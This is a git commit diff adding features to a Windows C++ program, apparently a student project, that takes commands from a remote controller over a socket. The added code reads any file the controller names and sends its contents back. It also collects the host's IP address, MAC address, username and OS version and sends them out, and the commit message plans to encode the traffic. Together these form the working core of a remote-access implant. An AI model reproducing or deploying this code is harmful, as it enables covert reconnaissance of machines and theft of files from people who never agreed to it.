4c6e87951014710afbadaad57ddbba6d8938cc88
Russell <rdh1896@rit.edu>
2022-04-12 11:07:17 -0700

    Got all functionality of program implemented, must add encoding algorithm for network communications.

--- Source.cpp
+++ Source.cpp
@@ -1,3 +1,4 @@
+#define WIN32_LEAN_AND_MEAN
 #include <iostream>
 #include <WS2tcpip.h>
 #include <string>
@@ -6,8 +7,16 @@
 #include <psapi.h>
 #include <sal.h>
 #include <fstream>
+#include <windows.h>
+#include <stdint.h>
+#include <iphlpapi.h>
+#include <sysinfoapi.h>
+#include <sstream>
 
 #pragma comment (lib, "ws2_32.lib")
+#pragma comment(lib, "iphlpapi.lib")
+#pragma warning(disable : 4996)
+
 
 using namespace std;
 
@@ -51,7 +60,7 @@ string get_proc_info(DWORD processID) {
 	return output;
 }
 
-string list_procs(SOCKET sock) {
+string list_procs() {
 	// Get the list of process identifiers.
 
 	DWORD aProcesses[1024], cbNeeded, cProcesses;
@@ -94,6 +103,172 @@ BOOL upload_file(string file_contents) {
 		return TRUE;
 	}
 	return FALSE;
+}
+
+string download_file(string file_name) {
+	fstream my_file;
+	my_file.open(file_name, ios::in);
+	if (!my_file) {
+		return "FNF";
+	}
+	else {
+		string contents;
+		string temp;
+		while (getline(my_file, temp)) {
+			contents.append(temp + "\n");
+		}
+		my_file.close();
+		return contents;
+	}
+	return "FNF";
+}
+
+string get_MAC_addr()
+{
+	PIP_ADAPTER_INFO info = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IP_ADAPTER_INFO));
+	ULONG bufSz = sizeof(IP_ADAPTER_INFO);
+	if (info)
+	{
+		if (GetAdaptersInfo(info, &bufSz) == ERROR_BUFFER_OVERFLOW)
+		{
+			info = (PIP_ADAPTER_INFO)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, info, bufSz);
+		}
+
+		if (info)
+		{
+			if (GetAdaptersInfo(info, &bufSz) == ERROR_SUCCESS)
+			{
+				PIP_ADAPTER_INFO ptr = info;
+				while (ptr)
+				{
+					if (ptr->Type == MIB_IF_TYPE_ETHERNET || ptr->Type == IF_TYPE_IEEE80211)
+					{
+						char* addr = (char*)malloc(18);
+						sprintf(addr, "%02X:%02X:%02X:%02X:%02X:%02X",
+							ptr->Address[0], ptr->Address[1],
+							ptr->Address[2], ptr->Address[3],
+							ptr->Address[4], ptr->Address[5]);
+						std::string mac = addr;
+						return mac;
+
+					}
+					ptr = ptr->Next;
+				}
+			}
+
+			HeapFree(GetProcessHeap(), 0, info);
+		}
+	}
+	return "";
+}
+
+string get_ip_addr()
+{
+	PIP_ADAPTER_INFO info = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IP_ADAPTER_INFO));
+	ULONG bufSz = sizeof(IP_ADAPTER_INFO);
+	if (info)
+	{
+		if (GetAdaptersInfo(info, &bufSz) == ERROR_BUFFER_OVERFLOW)
+		{
+			info = (PIP_ADAPTER_INFO)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, info, bufSz);
+		}
+		if (info)
+		{
+			if (GetAdaptersInfo(info, &bufSz) == ERROR_SUCCESS)
+			{
+				PIP_ADAPTER_INFO ptr = info;
+				while (ptr)
+				{
+					if (ptr->Type == MIB_IF_TYPE_ETHERNET || ptr->Type == IF_TYPE_IEEE80211)
+					{
+						string result = ptr->IpAddressList.IpAddress.String;
+
+						HeapFree(GetProcessHeap(), 0, info);
+						return result;
+					}
+					ptr = ptr->Next;
+				}
+			}
+			HeapFree(GetProcessHeap(), 0, info);
+		}
+	}
+
+	return "IP NOT FOUND";
+}
+
+string get_user() {
+	char username[257];
+	DWORD size = sizeof(username);
+	GetUserNameA(username, &size);
+	string user = username;
+	return user;
+}
+
+string getOsName() {
+	#ifdef _WIN32
+		return "Windows 32-bit";
+	#elif _WIN64
+		return "Windows 64-bit";
+	#elif __APPLE__ || __MACH__
+		return "Mac OSX";
+	#elif __linux__
+		return "Linux";
+	#elif __FreeBSD__
+		return "FreeBSD";
+	#elif __unix || __unix__
+		return "Unix";
+	#else
+		return "Other";
+	#endif
+}
+
+string get_os() {
+	string content;
+	content.append(getOsName());
+	if (content == "Windows 32-bit" || content == "Windows 64-bit") {
+		OSVERSIONINFO osver;
+		osver.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
+		GetVersionEx(&osver);
+		DWORD major;
+		DWORD minor;
+		DWORD build;
+		major = osver.dwMajorVersion;
+		minor = osver.dwMinorVersion;
+		build = osver.dwBuildNumber;
+		ostringstream majStream;
+		ostringstream minStream;
+		ostringstream buildStream;
+		majStream << major;
+		minStream << minor;
+		buildStream << build;
+		string majVer = majStream.str();
+		string minVer = minStream.str();
+		string buildVer = buildStream.str();
+		content.append(" Version " + majVer + "." + minVer + " (" + buildVer + ")\n");
+		return content;
+	} else {
+		return content;
+	}
+	return "";
+}
+	
+
+string sys_info() {
+	// Setup string
+	string si;
+	// IP
+	string ip = get_ip_addr();
+	si.append("IP Address: " + ip + "\n");
+	// MAC
+	string mac = get_MAC_addr();
+	si.append("MAC Address: " + mac + "\n");
+	// USER
+	string user = get_user();
+	si.append("User: " + user + "\n");
+	// OS
+	string os = get_os();
+	si.append("Operating System: " + os + "\n");
+	return si;
 }
 
 void main()
@@ -149,7 +324,7 @@ void main()
 			// Echo response to console
 			string resp = string(buffer, 0, bytesReceived);
 			if (resp == string("list_procs")) {
-				string procs = list_procs(sock);
+				string procs = list_procs();
 				_Post_ _Notnull_ char *proc_list = (char*)malloc(procs.size() + 1);
 				memcpy(proc_list, procs.c_str(), procs.size() + 1);
 				//proc_list = procs.c_str();
@@ -188,10 +363,44 @@ void main()
 				}
 			}
 			if (resp == string("download_file")) {
-
+				char download_buffer[4096];
+				int downloadBytesReceived = recv(sock, download_buffer, 4096, 0);
+				if (bytesReceived > 0) {
+					string download_resp = string(download_buffer, 0, downloadBytesReceived);
+					string result = download_file(download_resp);
+					if (result != "FNF") {
+						//string succ = "Success! File has been uploaded";
+						//cout << succ;
+						_Post_ _Notnull_ char* succ_succ = (char*)malloc(result.size() + 1);
+						memcpy(succ_succ, result.c_str(), result.size() + 1);
+						send(sock, succ_succ, strlen(succ_succ), 0);
+						free(succ_succ);
+					}
+					else {
+						string succ = "Failure! File has not been downloaded";
+						cout << succ;
+						_Post_ _Notnull_ char* succ_succ = (char*)malloc(succ.size() + 1);
+						memcpy(succ_succ, succ.c_str(), succ.size() + 1);
+						send(sock, succ_succ, strlen(succ_succ), 0);
+						free(succ_succ);
+					}
+				}
+				else {
+					string succ = "Failure! File has not been downloaded";
+					cout << succ;
+					_Post_ _Notnull_ char* succ_succ = (char*)malloc(succ.size() + 1);
+					memcpy(succ_succ, succ.c_str(), succ.size() + 1);
+					send(sock, succ_succ, strlen(succ_succ), 0);
+					free(succ_succ);
+				}
 			}
 			if (resp == string("sys_info")) {
-
+				string info = sys_info();
+				_Post_ _Notnull_ char* info_report = (char*)malloc(info.size() + 1);
+				memcpy(info_report, info.c_str(), info.size() + 1);
+				//proc_list = procs.c_str();
+				send(sock, info_report, strlen(info_report), 0);
+				free(info_report);
 			}
 			if (resp == string("exit")) {
 				running = FALSE;
